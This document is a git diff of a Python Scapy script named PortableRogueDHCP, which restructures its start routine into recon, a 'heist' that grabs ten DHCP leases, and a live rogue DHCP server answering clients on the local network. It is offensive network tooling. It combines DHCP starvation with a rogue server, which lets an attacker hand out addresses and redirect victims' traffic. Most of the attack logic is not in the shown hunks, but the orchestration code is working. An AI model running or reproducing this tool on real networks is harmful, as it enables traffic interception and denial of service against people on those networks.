@@ -6,10 +6,8 @@ import signal
 import sys
 from scapy.all import *
 
-# Tell Scapy not to drop packets if the IP doesn't match the interface natively
 conf.checkIPaddr = False
 
-# --- DHCP Configuration Constants ---
 DHCP_DISCOVER = 1
 DHCP_OFFER = 2
 DHCP_REQUEST = 3
@@ -43,7 +41,6 @@ class PortableRogueDHCP:
         print(f"    | Detected Server MAC: {self.server_mac}")
         print(f"    | Detected Server IP:  {self.server_ip}\n")
 
-        # Register Signal Handler
         signal.signal(signal.SIGINT, self.signal_handler)
 
     def signal_handler(self, sig, frame):
@@ -349,7 +346,7 @@ class PortableRogueDHCP:
 
             print(f"\n[?] [REQUEST] received from {client_mac} for {req_ip} (Target Server: {requested_server_id})")
 
-            # VALIDATION 1: Is this request meant for this server?
+            # VALIDATION 1: Is this request meant for my server?
             if requested_server_id == self.server_ip or requested_server_id is None:
                 is_valid = False
 
@@ -389,18 +386,29 @@ class PortableRogueDHCP:
                 print(f"\n[-] RELEASE: Client {client_mac} released {released_ip}. Returned to pool.")
 
     def start(self):
-        if self.phase_1_recon():
-            self.phase_1_5_companion_discovery()
-            self.phase_2_heist(count=10)
-            if self.stolen_leases:
-                threading.Thread(target=self.background_state_manager, daemon=True).start()
-                print("[*] PHASE 3: ROUGE SERVER LIVE. Listening for clients... (Press Ctrl+C to stop)\n")
-                # Use stop_filter to allow sniff to exit gracefully when self.running is False
-                sniff(filter="udp and (port 67 or 68)",
-                      prn=self.phase_3_serve,
-                      stop_filter=lambda x: not self.running,
-                      store=0,
-                      iface=self.iface)
+        # PHASE 1: Recon
+        if not self.phase_1_recon():
+            print("\n[!] DHCP lease could not be obtained, please relaunch\n")
+            return
+
+        # PHASE 1.5: Companion discovery
+        self.phase_1_5_companion_discovery()
+
+        # PHASE 2: Heist
+        self.phase_2_heist(count=10)
+        if not self.stolen_leases:
+            print("\n[!] DHCP lease could not be obtained, please relaunch\n")
+            return
+
+        # PHASE 3: Serve
+        threading.Thread(target=self.background_state_manager, daemon=True).start()
+        print("[*] PHASE 3: ROUGE SERVER LIVE. Listening for clients... (Press Ctrl+C to stop)\n")
+
+        sniff(filter="udp and (port 67 or 68)",
+            prn=self.phase_3_serve,
+            stop_filter=lambda x: not self.running,
+            store=0,
+            iface=self.iface)
 
 if __name__ == "__main__":
     server = PortableRogueDHCP()
